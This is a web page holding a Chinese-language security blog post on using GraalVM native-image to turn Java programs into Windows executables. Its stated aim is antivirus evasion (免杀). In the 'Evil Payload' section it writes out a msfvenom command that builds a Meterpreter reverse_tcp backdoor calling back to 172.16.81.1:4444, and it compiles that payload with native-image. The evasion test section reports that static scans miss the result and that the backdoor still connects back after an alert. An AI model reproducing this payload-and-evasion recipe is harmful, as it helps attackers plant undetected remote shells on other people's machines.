@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Jar To Exe新方案 | rebootORZ Security</title>
+
+    
+<link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+
+
+
+
+<meta name="author" content="rebootORZ" />
+<meta name="description" content="说明 之前的文章《.Jar To .Exe免杀探索》中，存在一个很大的问题，就是打包后的文件会很大，这里经过大佬的指点，发现了另一种方法进行打包，可" />
+
+
+
+<meta name="generator" content="Hugo 0.101.0" />
+
+<link rel="canonical" href="https://rebootorz.github.io/posts/jar-to-exe%E6%96%B0%E6%96%B9%E6%A1%88/" />
+
+
+<meta property="og:title" content="Jar To Exe新方案" />
+<meta property="og:description" content="说明 之前的文章《.Jar To .Exe免杀探索》中，存在一个很大的问题，就是打包后的文件会很大，这里经过大佬的指点，发现了另一种方法进行打包，可" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://rebootorz.github.io/posts/jar-to-exe%E6%96%B0%E6%96%B9%E6%A1%88/" /><meta property="og:image" content="https://rebootorz.github.io/me/background.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-05T13:56:26+08:00" />
+<meta property="article:modified_time" content="2022-07-05T13:56:26+08:00" />
+
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://rebootorz.github.io/me/background.jpg"/>
+
+<meta name="twitter:title" content="Jar To Exe新方案"/>
+<meta name="twitter:description" content="说明 之前的文章《.Jar To .Exe免杀探索》中，存在一个很大的问题，就是打包后的文件会很大，这里经过大佬的指点，发现了另一种方法进行打包，可"/>
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.css" integrity="sha256-UXesixbeLkB/UYxVTzuj/gg3+LMzgwAmg3zD+C4ZASQ=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/css/OverlayScrollbars.min.css" integrity="sha256-WKijf8KI68sbq8Znd6yMepIuFF0wdWfIt6gk3JWcQfk=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css">
+<link rel="stylesheet" href="/css/site.css" />
+
+<style>
+  .ui.header a:not(.item, .ui.button):hover {
+    text-decoration: underline;
+  }
+
+  
+  a:not(.item, .ui.button) {
+    color: seagreen !important;
+  }
+  
+
+  
+  .inverted a:not(.item, .ui.button) {
+     color: darkseagreen !important;
+  }
+  
+
+  
+  body.default {
+    
+    background-color: #fff;
+    
+
+    
+    background-image: url(/me/black_background.jpg);
+    
+  }
+  
+
+  
+  body.dark {
+    
+
+    
+    background-image: url(/me/light_background.jpeg);
+    
+  }
+  
+</style>
+
+
+    
+
+
+
+
+
+
+
+    
+    <link rel="stylesheet" href="/css/custom.css" />
+    
+  </head>
+
+  <body class="default">
+    
+<nav class="ui secondary menu dream-menu dream-nav">
+
+  <a class="item dream-flip-toggle" title="翻转！">
+    <i class="large link bullseye icon"></i>
+  </a>
+  <a class="item" href="https://rebootorz.github.io" title="首页">
+    <i class="large link home icon"></i>
+  </a>
+  
+  <a class="item" onclick="themeSwitch(event)">
+    <i class="large link icon theme-switch"></i>
+  </a>
+  
+  
+  <a class="item" title="搜索" onclick="toggleSearch(event)">
+    <i class="large link search icon"></i>
+  </a>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui relaxed centered grid dream-grid dream-grid-single">
+  
+  
+  
+  
+
+  
+  <aside class="sixteen wide mobile sixteen wide tablet three wide computer column dream-single-aside">
+    
+    <div class="ui segment toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#说明">说明</a></li>
+    <li><a href="#前置知识">前置知识</a>
+      <ul>
+        <li><a href="#jit">JIT</a></li>
+      </ul>
+    </li>
+    <li><a href="#aot">AOT</a>
+      <ul>
+        <li><a href="#graalvm与hostspot-jvm">GraalVM与HostSpot JVM</a></li>
+      </ul>
+    </li>
+    <li><a href="#环境准备">环境准备</a>
+      <ul>
+        <li><a href="#相关环境信息">相关环境信息</a></li>
+        <li><a href="#graalvm环境配置">GraalVM环境配置</a></li>
+      </ul>
+    </li>
+    <li><a href="#方案测试">方案测试</a>
+      <ul>
+        <li><a href="#helloworld">HelloWorld</a></li>
+        <li><a href="#evil-payload">Evil Payload</a></li>
+        <li><a href="#免杀效果测试">免杀效果测试</a></li>
+      </ul>
+    </li>
+    <li><a href="#报错解决">报错解决</a>
+      <ul>
+        <li><a href="#clexe-not-found">cl.exe not found</a></li>
+        <li><a href="#include-error">include error</a></li>
+        <li><a href="#未配置libcmtlib">未配置LIBCMT.lib</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考资料">参考资料</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    
+  </aside>
+  
+  <div class="sixteen wide mobile sixteen wide tablet ten wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    <section class="ui segment">
+      <header>
+        <h1 class="ui large header">Jar To Exe新方案<span class="sub header">
+            <span class="left">
+              @
+              
+                
+                  rebootORZ
+                
+              
+
+              | 
+                  <span data-format="luxon">2022-07-05T13:56:26&#43;08:00</span>
+                
+
+              | 5 分钟阅读
+
+              
+              | 更新于
+                
+                  <span data-format="luxon">2022-07-05T13:56:26&#43;08:00</span>
+                
+              
+            </span>
+
+            
+            <span class="dream-share">
+  <a href="#" class="save-as-image" title="保存为图片" onclick="savePostAsImg()">
+    <i class="save icon"></i>
+  </a>
+  <a href="https://twitter.com/intent/tweet?text=Jar%20To%20Exe%e6%96%b0%e6%96%b9%e6%a1%88&url=https%3a%2f%2frebootorz.github.io%2fposts%2fjar-to-exe%25E6%2596%25B0%25E6%2596%25B9%25E6%25A1%2588%2f" title="Twitter">
+    <i class="twitter icon"></i>
+  </a>
+  <a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frebootorz.github.io%2fposts%2fjar-to-exe%25E6%2596%25B0%25E6%2596%25B9%25E6%25A1%2588%2f" title="Facebook">
+    <i class="facebook icon"></i>
+  </a>
+</span>
+
+            
+          </span>
+        </h1>
+      </header>
+
+      <article class="main">
+        
+
+        <h2 id="说明">说明</h2>
+<p>之前的文章《.Jar To .Exe免杀探索》中，存在一个很大的问题，就是打包后的文件会很大，这里经过大佬的指点，发现了另一种方法进行打包，可以使得文件变小不少，这里提供该方案的具体操作方式和其中遇到的一些踩坑细节及解决方法。</p>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="jit">JIT</h3>
+<p>JIT(Just-In-Time)，一般翻译为即时编译器，是一种Java虚拟机的优化技术。在早期的java虚拟机工作流程中，java代码先由javac编译成字节码，再交给解释器来解释执行，但是这样效率太低，后来诞生了JIT技术，当编译成字节码后，虚拟机会将使用频率较高的方法或语句块交由JIT对将这些字节码翻译成机器码（提前进行），这样当运行程序的时候就能直接就用了，而不是边运行边翻译，大大提高了代码执行的效率。</p>
+<h2 id="aot">AOT</h2>
+<p>AOT是Ahead-of-Time的缩写，是指运行前编译，可以在安装时对二进制码进行编译，提高在运行时的执行速度
+优势：可以提高速度（特别是启动时间）、减少内存足迹（不是JIT）和改进内存回收。</p>
+<h3 id="graalvm与hostspot-jvm">GraalVM与HostSpot JVM</h3>
+<p><strong>HotSpot JVM与JVM</strong></p>
+<p>JVM是虚拟机，总的来说是一种标准规范，虚拟机有很多实现版本。主要作用就是运行java的类文件的。
+而HotSpot是虚拟机的一种实现，它是sun公司开发的，是sun jdk和open jdk中自带的虚拟机，同时也是目前使用范围最广的虚拟机。
+二者区别是一个是标准，一个是实现方式。</p>
+<p><strong>HotSpot JVM</strong></p>
+<p>HotSpot JVM的作用是运行java字节码，即.class文件，并在运行过程中对代码不断进行分析，然后将其翻译成机器码，这个操作实在运行时完成的，而非在程序运行之前完成。</p>
+<p><strong>GraalVM</strong></p>
+<p>GraalVM是Oracle开发的用纯Java编写的JVM扩展，支持多语言编程和提前编译。</p>
+<p><strong>官方说明：</strong></p>
+<p>&ldquo;Any JVM-based application that runs on Java HotSpot VM can run on  GraalVM. GraalVM is based on Java HotSpot VM, but integrates an advanced  just-in-time (JIT) compiler, written in Java - the GraalVM compiler. At runtime, the application is loaded and executed normally on the JVM. The JVM passes bytecode to the GraalVM compiler, which compiles that to  the machine code and returns it to the JVM.&rdquo;</p>
+<p>”任何在 Java HotSpot VM 上运行的基于 JVM 的应用程序都可以在 GraalVM 上运行。 GraalVM 基于 Java HotSpot VM，但集成了一个用 Java 编写的高级即时 (JIT) 编译器——GraalVM 编译器。在运行时，应用程序在 JVM 上正常加载和执行。 JVM 将字节码传递给 GraalVM 编译器，后者将其编译为机器代码并将其返回给 JVM。“</p>
+<p>&ldquo;GraalVM’s dynamic compiler can improve the efficiency and the speed  of applications written in Java, Scala, Kotlin, or other JVM languages  through unique approaches to code analysis and optimization. For example, it assures performance advantages for highly abstracted  programs due to its ability to remove costly object allocations. To learn more, go to the <a href="https://www.graalvm.org/reference-manual/compiler/">Compiler</a> page. The open source compiler’s code is available on <a href="https://github.com/oracle/graal/tree/master/compiler">GitHub</a>.&rdquo;</p>
+<p>”GraalVM 的动态编译器可以通过独特的代码分析和优化方法提高用 Java、Scala、Kotlin 或其他 JVM 语言编写的应用程序的效率和速度。例如，由于它能够消除代价高昂的对象分配，它确保了高度抽象程序的性能优势。要了解更多信息，请转到<a href="https://www.graalvm.org/reference-manual/compiler/">编译器</a>页面。开源编译器的代码可在<a href="https://github.com/oracle/graal/tree/master/compiler">GitHub</a>.上找到。“</p>
+<p><strong>简单而言：</strong></p>
+<p>传统的java虚拟机都是在运行时将字节码翻译成机器码，而GraalVM则使用了AOT技术，可以提前将程序编译为本地可执行文件，与JVM相比，生成的程序具有更快的启动时间和更低的运行时内存开销，当然这些所有的优势在我们的测试中肯定是看不出来太大的好处的，毕竟这是用于开发中的技术，而对于我们的免杀测试主要是一种新的方案。</p>
+<h2 id="环境准备">环境准备</h2>
+<h3 id="相关环境信息">相关环境信息</h3>
+<ul>
+<li>Windows 10 Professional 19042.631</li>
+<li>Java 1.8.0_211</li>
+<li>IDeaJ 2021.01</li>
+</ul>
+<ul>
+<li>
+<p>一个正常的java项目</p>
+</li>
+<li>
+<p><a href="https://github.com/graalvm/graalvm-ce-builds/releases">GraalVM</a></p>
+<p>这里我下载的是graalvm-ce-java8-windows-amd64-21.2.0.zip</p>
+</li>
+<li>
+<p>Visual Studio 2019</p>
+</li>
+<li>
+<p>Jd-gui</p>
+</li>
+</ul>
+<h3 id="graalvm环境配置">GraalVM环境配置</h3>
+<p><strong>添加系统环境变量</strong></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>GRAALVM_HOME      C:\Program Files\graalvm-ce-java8-21.2.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>JAVA_HOME      C:\Program Files\graalvm-ce-java8-21.2.0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>安装native-image</strong></p>
+<p>这个其实是官方提供的虚拟机，安装需要管理员权限。</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gu install native-image
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/imgs/image-20210906150645475.png" alt="image-20210906150645475"></p>
+<p><strong>设置PATH环境变量优先使用$GRAALVM_HOME/bin</strong></p>
+<p><img src="/imgs/image-20210906151103676.png" alt="image-20210906151103676"></p>
+<h2 id="方案测试">方案测试</h2>
+<h3 id="helloworld">HelloWorld</h3>
+<p>以HelloWorld.java项目为例</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">HelloWorld</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span> 
+</span></span><span style="display:flex;"><span>		System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Hello World&#34;</span><span style="color:#ff79c6">);</span> 
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>传统方法中，要执行上述代码，流程如下：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ javac HelloWorld.java
+</span></span><span style="display:flex;"><span>$ java HelloWorld.class
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hello World
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用GraalVM：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ javac HelloWorld.java
+</span></span><span style="display:flex;"><span>$ native-image HelloWorld
+</span></span><span style="display:flex;"><span>$ HelloWorld.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hello World
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/imgs/image-20210906155402650.png" alt="image-20210906155402650"></p>
+<h3 id="evil-payload">Evil Payload</h3>
+<p>老样子，我们用msf生成一个恶意payload进行测试，因为这里与上次方案的区别，这次是对.class进行处理，而上次是对.jar进行打包，所以这里先生成一个.jar的后门，然后对其反编译得到msf payload的java代码：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msfvenom -p java/meterpreter/reverse_tcp LHOST=172.16.81.1 LPORT=4444 x &gt;~/Desktop/test.jar
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/imgs/image-20210906160232473.png" alt="image-20210906160232473"></p>
+<p>直接解压test.jar文件：</p>
+<p><img src="/imgs/image-20210906162616766.png" alt="image-20210906162616766"></p>
+<p>先测试一下能不能用：</p>
+<p><img src="/imgs/image-20210906164116563.png" alt="image-20210906164116563"></p>
+<p>成功上线：</p>
+<p><img src="/imgs/image-20210906164143681.png" alt="image-20210906164143681"></p>
+<p>接下来进行处理：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>native-image Payload
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>生成成功：</p>
+<p><img src="/imgs/image-20210906165030889.png" alt="image-20210906165030889"></p>
+<p><img src="/imgs/image-20210906165226256.png" alt="image-20210906165226256"></p>
+<p>大小只有8.239M</p>
+<p>成功上线：</p>
+<p><img src="/imgs/image-20210906165006069.png" alt="image-20210906165006069"></p>
+<p>查看任务管理器：</p>
+<p><img src="/imgs/image-20210906165405951.png" alt="image-20210906165405951"></p>
+<h3 id="免杀效果测试">免杀效果测试</h3>
+<p>直接查杀，全都没有查出来：</p>
+<p><img src="/imgs/image-20210906165656876.png" alt="image-20210906165656876"></p>
+<p>执行后查出恶意payload，但依然上线</p>
+<img src="/imgs/image-20210906165754386.png" alt="image-20210906165754386" style="zoom:67%;" />
+<p><img src="/imgs/image-20210906165832544.png" alt="image-20210906165832544"></p>
+<p>这次即使执行命令也不会再告警，后台中能看到的依然是如下：</p>
+<p><img src="/imgs/image-20210906165942690.png" alt="image-20210906165942690"></p>
+<p>但是同样的，如果开启了内存相关检测的防御手段还是会告警：</p>
+<p><img src="/imgs/image-20210906170131533.png" alt="image-20210906170131533"></p>
+<p>但是要在没有java环境的机器上使用，还是不够的，可以仔细看下，在生成的时候下面有这么一句话：</p>
+<p>因为代码中使用了其他的库，所以这里需要提供jdk支持</p>
+<p><img src="/imgs/image-20210906223140438.png" alt="image-20210906223140438"></p>
+<h2 id="报错解决">报错解决</h2>
+<p>这里对一些可能遇到的坑点进行梳理，提供解决方法。</p>
+<h3 id="clexe-not-found">cl.exe not found</h3>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Error: Default native-compiler executable ‘cl.exe’ not found via environment variable PATH
+</span></span><span style="display:flex;"><span>Error: To prevent native-toolchain checking provide command-line option -H:-CheckToolchain
+</span></span><span style="display:flex;"><span>Error: Use -H:+ReportExceptionStackTraces to print stacktrace of underlying exception
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>cl.exe是visual studio中的工具，需要安装vs2019，并安装如下组件：</p>
+<p><img src="/imgs/image-20210906152108678.png" alt="image-20210906152108678"></p>
+<p>添加环境变量：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>在PATH中添加：
+</span></span><span style="display:flex;"><span>C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.16.27023\bin\HostX64\x64
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="include-error">include error</h3>
+<p><img src="/imgs/image-20210906151455339.png" alt="image-20210906151455339"></p>
+<p>需要添加如下环境变量：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>INCLUDE=C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\ucrt;C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\um;C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\shared;C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.16.27023\include.;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注：这里的Windows Kits目录是需要安装VS2019中的Windows SDK后才会有的：</p>
+<p><img src="/imgs/image-20210906151754625.png" alt="image-20210906151754625"></p>
+<h3 id="未配置libcmtlib">未配置LIBCMT.lib</h3>
+<p><img src="/imgs/image-20210906153002012.png" alt="image-20210906153002012"></p>
+<p>添加如下环境变量：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>LIB=C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\um\x64;C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\ucrt\x64;C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.16.27023\lib\x64;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="参考资料">参考资料</h2>
+<p><a href="https://blog.csdn.net/qq_36042506/article/details/82976586">《Java之什么是JIT （Just In Time）？》</a></p>
+<p><a href="https://www.cnblogs.com/dongxishaonian/p/13326310.html">《GraalVM – An Introduction to the Next Level JVM》</a></p>
+
+      </article>
+    </section>
+
+    
+
+    
+
+    
+  </div>
+</div>
+
+
+            <footer class="ui basic center aligned segment" style="background-color: transparent;">
+              
+              <p>© 2021 - 2022 rebootORZ Security</p>
+              
+
+              <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> with theme <a href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</p>
+
+              
+            </footer>
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <header class="ui basic very padded segment dream-header">
+  
+  <div class="ui small circular image">
+    <img src="/me/gl.jpg" alt="avatar" />
+  </div>
+  
+
+  <div class="content">
+    <h1 class="ui medium header">rebootORZ Security , EXP Loading ...<span class="sub header">🦶走过的叫足迹 ，走不到叫憧憬。</span>
+    </h1>
+
+    <article class="ui horizontal list">
+      
+      <a class="item" href="/posts">
+        <i class="archive icon" title="归档"></i>
+      </a>
+      
+      <a class="item" href="/categories">
+        <i class="th list icon" title="所有分类"></i>
+      </a>
+      <a class="item" href="/tags">
+        <i class="tags icon" title="所有标签"></i>
+      </a>
+    </article>
+
+    
+    
+    
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+
+    
+
+    
+    
+    
+          <div class="dream-tags">
+          
+          
+          
+            <a class="ui label" href="/tags/java/" title="java">
+              java
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/jsp/" title="jsp">
+              jsp
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/springboot/" title="SpringBoot">
+              SpringBoot
+            </a>
+          
